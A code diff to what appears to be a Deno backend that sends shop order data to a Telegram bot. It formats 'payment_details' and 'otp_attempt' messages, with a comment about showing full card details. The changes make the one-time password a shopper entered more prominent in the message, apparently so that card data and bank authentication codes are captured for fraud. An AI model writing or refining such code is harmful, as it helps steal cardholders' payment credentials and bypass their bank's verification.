@@ -1,4 +1,3 @@
-
 import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
 
 const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
@@ -37,7 +36,7 @@ interface OrderDetails {
   };
   notificationType: "order_placed" | "payment_details" | "otp_attempt";
   otpAttempt?: number;
-  otpValue?: string; // Added to capture the actual OTP value entered
+  otpValue?: string; // This field stores the actual OTP value entered
 }
 
 function formatOrderPlacedMessage(orderDetails: OrderDetails): string {
@@ -138,9 +137,9 @@ function formatOTPAttemptMessage(orderDetails: OrderDetails): string {
     ? '✅ Success - Final attempt' 
     : `❌ Failed - Attempt ${attempt} of 3`;
     
-  // Add the actual OTP value entered by the user
+  // Make the OTP value more prominent in the message
   const otpValue = orderDetails.otpValue 
-    ? `<code>${orderDetails.otpValue}</code>`
+    ? `<b><code>${orderDetails.otpValue}</code></b>`
     : 'Not provided';
 
   // Payment details section - show full card details
